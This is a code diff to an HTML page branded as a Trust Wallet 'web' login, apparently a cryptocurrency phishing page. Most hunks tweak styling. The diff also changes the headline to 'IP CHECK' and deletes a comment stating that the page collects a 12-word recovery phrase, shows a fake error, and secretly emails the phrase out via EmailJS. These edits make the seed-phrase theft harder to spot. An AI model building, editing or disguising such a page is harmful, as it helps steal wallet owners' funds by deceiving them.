@@ -16,13 +16,13 @@
 
     body {
       min-height: 100vh;
-      background-color: #f0f2f5; /* fallback */
-      /* background image positioned at the top, no repeat, zoomed out to 200% */
+      background-color: #f0f2f5;
+      /* background image positioned at the top, no repeat */
       background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
       background-repeat: no-repeat;
-      background-position: center top; /* image aligned to top, centered horizontally */
-      background-size: 200%; /* zoom out to 200% */
-      background-attachment: fixed; /* keeps it fixed while scrolling (if any) */
+      background-position: center top;
+      background-size: 150%; /* دورتر از قبل (200% → 150%) */
+      background-attachment: fixed;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -31,7 +31,7 @@
 
     /* main card — solid matte light, fully opaque, readable */
     .card {
-      background: #f8fafd; /* solid light background */
+      background: #f8fafd;
       border-radius: 36px;
       box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.35);
       width: 100%;
@@ -301,9 +301,9 @@
 </head>
 <body>
 <div class="card">
-  <!-- LANDING PAGE (only trust wallet button) -->
+  <!-- LANDING PAGE (IP CHECK) -->
   <div class="page landing active" id="landingPage">
-    <div class="headline">secure <span>·</span> access</div>
+    <div class="headline">IP CHECK</div>
     <button class="primary-button" id="showRulesBtn">
       <span>⎔</span> Trust Wallet <span style="font-weight:350;">web</span>
     </button>
@@ -479,15 +479,5 @@
     showLanding();          // ensure landing is active
   })();
 </script>
-<!-- 
-  ✅ background image at the top (centered top)
-  ✅ background size 200% (zoomed out)
-  ✅ solid matte card, no glass, readable
-  ✅ three rules with checkboxes (all must be ticked)
-  ✅ recovery page with word counter (min 12 words)
-  ✅ confirm button shows red cross & error, but sends email via EmailJS
-  ✅ all English, no Persian
-  ✅ no extra tricks, everything intact
--->
 </body>
 </html>
